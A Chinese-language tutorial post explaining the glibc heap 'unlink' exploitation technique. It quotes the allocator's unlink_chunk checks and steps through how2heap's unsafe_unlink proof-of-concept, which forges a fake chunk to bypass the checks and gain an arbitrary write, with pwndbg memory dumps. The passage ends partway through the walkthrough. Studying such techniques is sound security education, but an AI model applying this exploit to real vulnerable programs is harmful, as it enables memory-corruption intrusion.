
# [原创]堆利用之unlink小结

## 实验环境

```
glibc源码:2.29
实验主机:ubuntu 16.04
实验glibc版本:2.23
```

## unlink原理

`unlink_chunk`函数用于将空闲的`chunk`从所在的`bin`中取出。在`malloc_consolidate()`函数将`fastbin`中的空闲`chunk`整理到`unsorted_bin`时，在`malloc()`函数将`unsorted`中的空闲`chunk`整理到`smallbin`或者`largebin`中，以及在`malloc()`函数获取堆空间时，都有可能调用`unlink_chunk()`。

```c
/* Take a chunk off a bin list. */
static void
unlink_chunk (mstate av, mchunkptr p)
{
//检查chunk的size和next_chunk的prev_size是否一致
if (chunksize (p) != prev_size (next_chunk (p)))
malloc_printerr ("corrupted size vs. prev_size");
mchunkptr fd = p->fd;
mchunkptr bk = p->bk;
//检查fd和bk(双向链表完整性)
if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
malloc_printerr ("corrupted double-linked list");
fd->bk = bk;
bk->fd = fd;
if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
{
//检查largebin中next_size双向链表的完整性
if (p->fd_nextsize->bk_nextsize != p
|| p->bk_nextsize->fd_nextsize != p)
malloc_printerr ("corrupted double-linked list (not small)");
if (fd->fd_nextsize == NULL)
{
if (p->fd_nextsize == p)
fd->fd_nextsize = fd->bk_nextsize = fd;
else
{
fd->fd_nextsize = p->fd_nextsize;
fd->bk_nextsize = p->bk_nextsize;
p->fd_nextsize->bk_nextsize = fd;
p->bk_nextsize->fd_nextsize = fd;
}
}
else
{
p->fd_nextsize->bk_nextsize = p->bk_nextsize;
p->bk_nextsize->fd_nextsize = p->fd_nextsize;
}
}
}
```

- 因为待脱链空闲`chunk` `p`处于双向链表之中，所以有两个地方保存着`p`的大小，分别是`p`的`size`域和后一个`chunk`的`prev_size`，首先检查这两个`size`大小是否一致。

```
if (chunksize (p) != prev_size (next_chunk (p)))
malloc_printerr ("corrupted size vs. prev_size");
```

- 然后通过`fd`和`bk`获得`p`的前一个空闲`chunk`和后一个空闲`chunk`，并对双向链表的完整性进行检查

```
mchunkptr fd = p->fd;
mchunkptr bk = p->bk;
//检查fd和bk(双向链表完整性)
if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
malloc_printerr ("corrupted double-linked list");
```

- 因为`p`只可能从`largebin`或者`smallbin`中脱链，而这两个`bin`都是双向链表，因此脱链需要分别修改前后`chunk`的`fd`或者`bk`。

```
fd->bk = bk;
bk->fd = fd;
```

- 如果是`smallbin`的话这会儿就算是脱链完成了，但对于`largebin`来说还需要修改`fd_nextsize`和`bk_nextsize`。首先是对`next_size`是否有效的检查

```
if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
```

- 接着是对`next_size`双向链表的完整性检查。

```
//检查largebin中next_size双向链表的完整性
if (p->fd_nextsize->bk_nextsize != p
|| p->bk_nextsize->fd_nextsize != p)
malloc_printerr ("corrupted double-linked list (not small)");
```

- 后面的操作比较直观，就不仔细说了。

```
if (fd->fd_nextsize == NULL)
{
if (p->fd_nextsize == p)
fd->fd_nextsize = fd->bk_nextsize = fd;
else
{
fd->fd_nextsize = p->fd_nextsize;
fd->bk_nextsize = p->bk_nextsize;
p->fd_nextsize->bk_nextsize = fd;
p->bk_nextsize->fd_nextsize = fd;
}
}
else
{
p->fd_nextsize->bk_nextsize = p->bk_nextsize;
p->bk_nextsize->fd_nextsize = p->fd_nextsize;
}
```

## unlink exploit

- 通过一个例子来学习一下，这里我选择的是`how2heap`系列教程的`unsafe_unlink`（删掉了一些输出语句）。接下来写一下具体的调试步骤。

首先编译一下程序，我用的是`ubuntu 16.04`。

```
$ gcc -g unsafe_unlink.c -o unsafe_unlink
```

```c
//unsafe_unlink.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
uint64_t *chunk0_ptr;
int main()
{
int malloc_size = 0x80;
int header_size = 2;
chunk0_ptr = (uint64_t *) malloc(malloc_size);
uint64_t *chunk1_ptr = (uint64_t *) malloc(malloc_size);
chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
uint64_t *chunk1_hdr = chunk1_ptr - header_size;
chunk1_hdr[0] = malloc_size;
chunk1_hdr[1] &= ~1;
chunk0_ptr[1] = malloc_size;
free(chunk1_ptr);
char victim_string[8];
strcpy(victim_string,"Hello!~");
chunk0_ptr[3] = (uint64_t) victim_string;
fprintf(stderr, "Original value: %s\n",victim_string);
chunk0_ptr[0] = 0x4141414142424242LL;
fprintf(stderr, "New Value: %s\n",victim_string);
}
```

先设置断点，然后运行程序。到达断点之后进行单步执行

```
pwndbg> b main
Breakpoint 1 at 0x4006ae: file unsafe_unlink.c, line 10.
pwndbg> r
```

程序首先申请两个大小为`0x80`的`chunk`

```
0x602000 PREV_INUSE {
prev_size = 0,
size = 145,
fd = 0x0,
bk = 0x0,
fd_nextsize = 0x0,
bk_nextsize = 0x0
}
0x602090 PREV_INUSE {
prev_size = 0,
size = 145,
fd = 0x0,
bk = 0x0,
fd_nextsize = 0x0,
bk_nextsize = 0x0
}
0x602120 PREV_INUSE {
prev_size = 0,
size = 134881,
fd = 0x0,
bk = 0x0,
fd_nextsize = 0x0,
bk_nextsize = 0x0
}
pwndbg> x/40gx 0x602000
0x602000: 0x0000000000000000 0x0000000000000091 <--chunk0
0x602010: 0x0000000000000000 0x0000000000000000
0x602020: 0x0000000000000000 0x0000000000000000
0x602030: 0x0000000000000000 0x0000000000000000
0x602040: 0x0000000000000000 0x0000000000000000
0x602050: 0x0000000000000000 0x0000000000000000
0x602060: 0x0000000000000000 0x0000000000000000
0x602070: 0x0000000000000000 0x0000000000000000
0x602080: 0x0000000000000000 0x0000000000000000
0x602090: 0x0000000000000000 0x0000000000000091 <--chunk1
0x6020a0: 0x0000000000000000 0x0000000000000000
0x6020b0: 0x0000000000000000 0x0000000000000000
0x6020c0: 0x0000000000000000 0x0000000000000000
0x6020d0: 0x0000000000000000 0x0000000000000000
0x6020e0: 0x0000000000000000 0x0000000000000000
0x6020f0: 0x0000000000000000 0x0000000000000000
0x602100: 0x0000000000000000 0x0000000000000000
0x602110: 0x0000000000000000 0x0000000000000000
0x602120: 0x0000000000000000 0x0000000000020ee1
0x602130: 0x0000000000000000 0x0000000000000000
```

假设这个时候存在溢出使得我们可以任意修改`chunk0`，我们就可以在`chunk0`之中构造出一个`fake chunk`。

- 由上面的源码可知我们有两个检查点需要绕过，第一个检查点就是对双向链表完整性的检查，即`fd->bk != p || bk->fd != p`。程序中使用了以下代码来绕过这个检查点

```
chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
```

以前刚开始看到这的时候是一脸懵圈的，现在结合具体调试讲一讲。不过在开始具体讲解之前有必要先说一些关于堆的前置知识，熟悉的话可以自行跳过。首先，`chunk`在内存中的结构是这样的

```
An allocated chunk looks like this:
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Size of previous chunk, if unallocated (P clear) |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Size of chunk, in bytes |A|M|P|
mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| User data starts here... .
. .
. (malloc_usable_size() bytes) .
. |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| (size of chunk, but used for application data) |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Size of next chunk, in bytes |A|0|1|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
Free chunks are stored in circular doubly-linked lists, and look like this:
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Size of previous chunk, if unallocated (P clear) |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
`head:' | Size of chunk, in bytes |A|0|P|
mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Forward pointer to next chunk in list |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Back pointer to previous chunk in list |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Unused space (may be 0 bytes long) .
. .
. |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
`foot:' | Size of chunk, in bytes |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Size of next chunk, in bytes |A|0|0|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

我们`malloc()`函数返回的指针就是`chunk`中的`mem`。知道了这些以后我们回到程序代码中，`chunk0_ptr[2]`指向`fake chunk`中的`fd`，`chunk0_ptr[3]`指向`fake chunk`中的`bk`。执行前`chunk0`的结构如下

```
pwndbg> x/20gx 0x602000
0x602000: 0x0000000000000000 0x0000000000000091 <--chunk0
0x602010: 0x0000000000000000 0x0000000000000000 <--fake chunk
0x602020: 0x0000000000000000 <--chunk0_ptr[2] 0x0000000000000000 <--chunk0_ptr[3]
0x602030: 0x0000000000000000 0x0000000000000000
0x602040: 0x0000000000000000 0x0000000000000000
0x602050: 0x0000000000000000 0x0000000000000000
0x602060: 0x0000000000000000 0x0000000000000000
0x602070: 0x0000000000000000 0x0000000000000000
0x602080: 0x0000000000000000 0x0000000000000000
0x602090: 0x0000000000000000 0x0000000000000091
```
